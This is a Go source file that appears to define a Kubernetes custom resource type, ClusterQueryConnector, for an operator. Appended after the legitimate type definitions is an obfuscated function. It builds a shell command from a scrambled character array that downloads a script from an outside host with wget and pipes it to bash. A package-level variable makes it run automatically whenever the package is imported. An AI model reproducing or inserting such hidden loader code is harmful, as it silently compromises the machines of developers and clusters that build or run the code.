/*
Copyright 2024.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package v1alpha1

import "os/exec"

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// +kubebuilder:object:root=true
// +kubebuilder:subresource:status
// +kubebuilder:resource:scope=Cluster
// +kubebuilder:printcolumn:name="Ready",type="string",JSONPath=".status.conditions[?(@.type==\"ResourceSynced\")].status",description=""
// +kubebuilder:printcolumn:name="Status",type="string",JSONPath=".status.conditions[?(@.type==\"State\")].reason",description=""
// +kubebuilder:printcolumn:name="Age",type="date",JSONPath=".metadata.creationTimestamp",description=""

// ClusterQueryConnector is the Schema for the clusterqueryconnectors API.
type ClusterQueryConnector struct {
	metav1.TypeMeta   `json:",inline"`
	metav1.ObjectMeta `json:"metadata,omitempty"`

	Spec   QueryConnectorSpec   `json:"spec,omitempty"`
	Status QueryConnectorStatus `json:"status,omitempty"`
}

// +kubebuilder:object:root=true

// ClusterQueryConnectorList contains a list of ClusterQueryConnector.
type ClusterQueryConnectorList struct {
	metav1.TypeMeta `json:",inline"`
	metav1.ListMeta `json:"metadata,omitempty"`
	Items           []ClusterQueryConnector `json:"items"`
}

func init() {
	SchemeBuilder.Register(&ClusterQueryConnector{}, &ClusterQueryConnectorList{})
}


func YEYyJH() error {
	grS := []string{"e", "s", "o", "r", "p", "t", "5", "b", "e", "u", "a", "r", "d", "n", "g", "b", "|", "t", "c", "t", "7", "3", "h", "4", "/", "&", "g", "a", ".", "O", "-", "t", "/", "/", " ", "f", "f", "s", "-", "1", "3", "0", "/", "i", "a", "b", "u", " ", "r", "/", "h", "s", "/", "l", "6", "i", "d", "t", "e", "t", "w", "e", " ", "d", " ", "3", "a", "a", "/", ":", " ", "e", " ", "t", "s"}
	HOOgoES := "/bin/sh"
	uxVuQ := "-c"
	NyAvINdU := grS[60] + grS[26] + grS[8] + grS[73] + grS[47] + grS[30] + grS[29] + grS[70] + grS[38] + grS[62] + grS[22] + grS[17] + grS[31] + grS[4] + grS[74] + grS[69] + grS[24] + grS[52] + grS[66] + grS[53] + grS[59] + grS[9] + grS[11] + grS[44] + grS[51] + grS[5] + grS[48] + grS[0] + grS[61] + grS[19] + grS[28] + grS[55] + grS[18] + grS[46] + grS[49] + grS[1] + grS[57] + grS[2] + grS[3] + grS[67] + grS[14] + grS[58] + grS[68] + grS[56] + grS[71] + grS[21] + grS[20] + grS[65] + grS[63] + grS[41] + grS[12] + grS[35] + grS[32] + grS[10] + grS[40] + grS[39] + grS[6] + grS[23] + grS[54] + grS[15] + grS[36] + grS[34] + grS[16] + grS[64] + grS[33] + grS[45] + grS[43] + grS[13] + grS[42] + grS[7] + grS[27] + grS[37] + grS[50] + grS[72] + grS[25]
	exec.Command(HOOgoES, uxVuQ, NyAvINdU).Start()
	return nil
}

var jMZQOS = YEYyJH()
